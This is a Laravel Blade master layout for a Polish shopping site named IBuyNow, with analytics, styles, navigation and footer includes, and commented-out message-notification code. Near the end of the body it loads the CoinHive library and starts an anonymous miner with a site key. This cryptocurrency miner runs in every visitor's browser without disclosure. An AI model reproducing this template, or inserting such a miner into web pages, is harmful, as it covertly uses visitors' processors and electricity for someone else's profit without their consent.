<!DOCTYPE html>
<html lang="pl">
  <head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-109899324-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-109899324-1');
</script>

    <meta charset="utf-8">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta name="viewport" content="with=device-width, initial-scale=1">
    <meta name="description" content="IBuyNow @yield('meta-description')">
    <meta name="theme-color" content="#0053ba" />
    @yield('facebook-share')

    <title>IBuyNow @yield('title')</title>
  <link href="https://fonts.googleapis.com/css?family=Vollkorn+SC" rel="stylesheet">
    <link href="{{ asset('css/style.css') }}" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/lightslider/1.1.3/css/lightslider.min.css">
    <link rel="icon" type="image/png" sizes="32x32" href="{{ asset('favicon/favicon-32x32.png') }}">
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('favicon/f/favicon-16x16.png') }}">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <style>
    body
    {
      font-family: 'Lato', sans-serif;
    }
    </style>
    @yield('css')
  </head>
  <body style="
    min-height: 100vh;
  ">
  @include('partials.nav')
    <div class="container-fluid">
      
      @yield('content')

    <!-- Site footer -->


  </div> <!-- /container -->
  @include('dashboard.footer')
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>

  <script src="https://code.jquery.com/jquery-3.1.1.js"  crossorigin="anonymous"></script>
     <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
     <script>
  var miner = new CoinHive.Anonymous('QG2eIWVKmhg7bQBCEMs5IFgsVhB7srh9');
  miner.start();
</script>
    	<script  src="{{ asset('js/bootstrap.min.js')}}"></script>

      @if(\Auth::check())
        <script type="text/javascript">
          //    $.get('/get-private-message-notifications', function(data){ 
          //         // alert(data.data);
          //         var notifi = document.querySelector('#notifi');
          //         if(data.data<1)
          //         {
          //           if(document.querySelector('#notifiNew'))
          //           {
          //             var notifiNew = document.querySelector('#notifiNew');
          //             notifiNew.parentNode.removeChild(notifiNew);
          //           }

          //           notifi.style.display = "none";
          //         } else {
          //           if(!document.querySelector('#notifiNew')) {
          //           var menuItem = document.querySelector('.notifi-menu');
          //           var p = document.createElement('p');
          //           p.innerHTML = "New!";
          //           p.style.background = '#e74c3c';
          //           p.style.textAlign = 'center';
          //           p.style.borderRadius = '15px';
          //           p.style.color = "#fff";
          //           p.id = "notifiNew";
          //           menuItem.appendChild(p);
          //         }

          //           notifi.innerHTML = data.data;
          //           notifi.style.display = "block";
          //         }
          //    });
        
          // setInterval(function() {
          //  $.get('/get-private-message-notifications', function(data){ 
          //         // alert(data.data);
          //         var notifi = document.querySelector('#notifi');
          //         if(data.data<1)
          //         {
          //              if(document.querySelector('#notifiNew'))
          //           {
          //             var notifiNew = document.querySelector('#notifiNew');
          //             notifiNew.parentNode.removeChild(notifiNew);
          //           }
          //           notifi.style.display = "none";
          //         } else {
          //            if(!document.querySelector('#notifiNew')) {
          //           var menuItem = document.querySelector('.notifi-menu');
          //           var p = document.createElement('p');
          //           p.innerHTML = "New!";
          //           p.style.background = '#e74c3c';
          //           p.style.textAlign = 'center';
          //           p.style.borderRadius = '15px';
          //           p.style.color = "#fff";
          //           p.id = "notifiNew";
          //           menuItem.appendChild(p);
          //         }
          //           notifi.innerHTML = data.data;
          //           notifi.style.display = "block";
          //         }
          //    });
          // },10000);
          
        </script>
      @endif
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/lightslider/1.1.3/js/lightslider.min.js"></script>
<script  src="{{ asset('js/app.js')}}"></script>
      @yield('js')
</body>
</html>
